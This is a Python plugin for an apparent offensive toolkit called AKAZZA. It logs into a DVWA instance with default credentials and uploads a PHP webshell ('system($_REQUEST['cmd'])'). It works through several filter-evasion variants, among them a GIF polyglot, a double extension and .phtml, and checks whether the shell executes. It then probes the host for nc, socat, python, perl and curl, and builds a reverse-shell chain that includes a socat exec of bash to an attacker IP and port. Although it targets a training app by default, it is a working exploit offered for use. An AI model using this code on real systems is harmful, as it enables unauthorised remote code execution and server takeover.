#!/usr/bin/env python3
"""
Muzan.py — AKAZZA v1.8 vector plugin.
Replicates the proven v1.3 auto-upload path exactly, and upgrades the
host's exploit chain to: socat → Bash TCP → Netcat → Python → Perl
→ PHP Socket → Curl Pipe.
"""

import re
import time
import requests
from datetime import datetime
from urllib.parse import urljoin

R, W, B = col["RESET"], col["WHITE"], col["BOLD"]
G, Y, RD, MG, CY = (col["GREEN"], col["YELLOW"], col["RED"],
                    col["MAGENTA"], col["CYAN"])

PHP_BODY = "<?php system($_REQUEST['cmd']); ?>"
SHELL_PARAM = "cmd"

UPLOAD_VARIANTS = [
    {"name": "plain .php",      "filename": "shell.php",     "content": PHP_BODY,                                "mime": "application/x-php"},
    {"name": "extension .php5", "filename": "shell.php5",    "content": PHP_BODY,                                "mime": "application/x-php"},
    {"name": "extension .phtml","filename": "shell.phtml",   "content": PHP_BODY,                                "mime": "application/x-php"},
    {"name": "GIF polyglot",    "filename": "shell.php",     "content": b"GIF89a" + PHP_BODY.encode(),           "mime": "image/gif"},
    {"name": "double extension","filename": "shell.php.jpg", "content": PHP_BODY,                                "mime": "image/jpeg"},
]


# ═══════════════════════════════════════════════
# CHAIN UPGRADE — socat first, curl last
# ═══════════════════════════════════════════════
def _install_chain_upgrade(akazza):
    _orig_fingerprint = akazza.fingerprint_victim
    _orig_payload     = akazza.payload_core

    def payload_core(method, ip, port):
        if method == "socat":
            return f"socat exec:'bash -i',pty,stderr TCP:{ip}:{port}"
        return _orig_payload(method, ip, port)

    def fingerprint_victim(shell_url, param):
        probe = ("for t in nc nc.traditional ncat socat python python3 perl php "
                 "curl wget bash sh; do p=$(which $t 2>/dev/null) && echo \"$t=$p\"; done; "
                 "echo \"uname=$(uname -s -m -r 2>/dev/null)\"; echo \"whoami=$(whoami)\"")
        out = akazza.webshell_cmd(shell_url, param, probe)
        fp = {}
        for line in out.splitlines():
            if "=" in line and "__ERROR__" not in line:
                k, v = line.split("=", 1)
                fp[k.strip()] = v.strip()
        if not fp:
            fp = {"bash": "/bin/bash"}
        print(f"{G}[+]{R} Fingerprint (Muzan chain):")
        for k, v in fp.items():
            print(f"{G}    {k:<16}{R}{v}")
        akazza.session_log["fingerprint"] = fp

        netcat = fp.get("nc") or fp.get("nc.traditional") or fp.get("ncat")
        chain = []
        if fp.get("socat"):                              chain.append(("socat", "socat"))
        if fp.get("bash") or fp.get("sh"):               chain.append(("Bash TCP", "1"))
        if netcat:                                       chain.append(("Netcat", "3"))
        if fp.get("python") or fp.get("python3"):        chain.append(("Python", "2"))
        if fp.get("perl"):                               chain.append(("Perl", "5"))
        if fp.get("php"):                                chain.append(("PHP Socket", "4"))
        if fp.get("curl") or fp.get("wget"):             chain.append(("Curl Pipe", "6"))
        if not chain:
            chain = [("Bash TCP", "1")]
        akazza.session_log["payload_chain"] = [c[0] for c in chain]
        return fp, chain

    akazza.fingerprint_victim = fingerprint_victim
    akazza.payload_core        = payload_core
    print(f"{MG}[Muzan]{R} chain upgraded: "
          f"socat → Bash TCP → Netcat → Python → Perl → PHP Socket → Curl Pipe")


# ═══════════════════════════════════════════════
# THE VECTOR PLUGIN (host contract)
# ═══════════════════════════════════════════════
@register_plugin("Muzan", "vector", priority=15, cwe="CWE-434",
                 attck="T1190; T1505.003",
                 desc="v1.3-proven DVWA upload evasion ladder + socat-first chain",
                 wants=["upload_form", "upload_weak", "apache"],
                 avoids=["upload_strict"])
def muzan_vector(akazza, surface, origin):
    print(f"\n{B}{MG}  ██ MUZAN — Upper Moon vector{R}")
    print(f"{W}─" * 50 + f"{R}\n")

    # NOTE: default straight at the DVWA path (v1.3 proven default)
    default_url = "http://192.168.44.131/dvwa/"
    if origin and "dvwa" in origin.lower():
        default_url = origin
    raw = input(f"{B}{W}muzan{R} {CY}➜{R} Target URL [{default_url}]: ").strip() or default_url
    base = raw.rstrip('/') + '/'

    sess = requests.Session()
    sess.headers.update({"User-Agent": akazza.session_log["user_agent"]})

    # ── login (token refreshed EVERY attempt — no stale CSRF) ──
    creds = [(u, p) for u, p in CONFIG["creds"]]
    if ("admin", "password") not in creds:
        creds.insert(0, ("admin", "password"))       # v1.3's proven pair, first

    logged_in = False
    for u, pw in creds:
        try:
            r = sess.get(base + "login.php", timeout=15)      # ← fresh token each try
            m = re.search(r"name=['\"]user_token['\"]\s+value=['\"]([a-f0-9]+)['\"]",
                          r.text)
            token = m.group(1) if m else ""
            sess.post(base + "login.php",
                      data={"username": u, "password": pw,
                            "Login": "Login", "user_token": token},
                      timeout=15)
            r = sess.get(base + "vulnerabilities/upload/", timeout=15)
            # same check v1.3 used — no clever URL heuristics
            if "Upload" in r.text:
                print(f"{G}[+]{R} Authenticated as {u}/{'*' * len(pw)}")
                logged_in = True
                break
        except Exception as e:
            print(f"{Y}[!]{R} try {u}: {e}")
            continue

    if not logged_in:
        print(f"{RD}[-]{R} [Muzan] DVWA login failed (creds rejected or {base} is wrong)")
        return None, None

    # ── evasion ladder — v1.3 behavior verbatim ──
    field = "uploaded"                          # v1.3's proven field name
    m = re.search(r"<input[^>]*type=[\"']?file[\"']?[^>]*name=[\"']([^\"']+)[\"']",
                  r.text, re.I)
    if m:
        field = m.group(1)

    if field != "uploaded":
        print(f"{Y}[!]{R} note: upload field is '{field}' (not 'uploaded')")

    upload_url = base + "vulnerabilities/upload/"
    upbeat     = base + "hackable/uploads/"    # v1.3 CONFIG's exact path

    for idx, v in enumerate(UPLOAD_VARIANTS, 1):
        fname = v["filename"]
        content = v["content"] if isinstance(v["content"], bytes) else v["content"].encode()
        print(f"{B}{Y}[Evasion {idx}/{len(UPLOAD_VARIANTS)}]{R} {B}{v['name']}{R} → {fname}")

        try:
            sess.post(upload_url, files={field: (fname, content, v["mime"])},
                      timeout=15)
        except Exception as e:
            print(f"{RD}    upload error: {e}{R}")
            continue

        shell_url = upbeat + fname
        out = akazza.webshell_cmd(shell_url, SHELL_PARAM, "echo ___MUZAN_OK___; id")
        if "___MUZAN_OK___" in out or "uid=" in out:
            print(f"{G}    [★] EXECUTES! Webshell live: {shell_url}{R}")
            akazza.session_log.update({
                "target_url": shell_url,
                "shell_parameter": SHELL_PARAM,
                "shell_variant": v["name"],
                "auto_uploaded": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
            })
            _install_chain_upgrade(akazza)
            return shell_url, SHELL_PARAM
        print(f"{Y}    [!] did not exec: /{fname} — next variant{R}")

    print(f"{RD}[-]{R} [Muzan] all evasion variants failed on {base}")
    return None, None
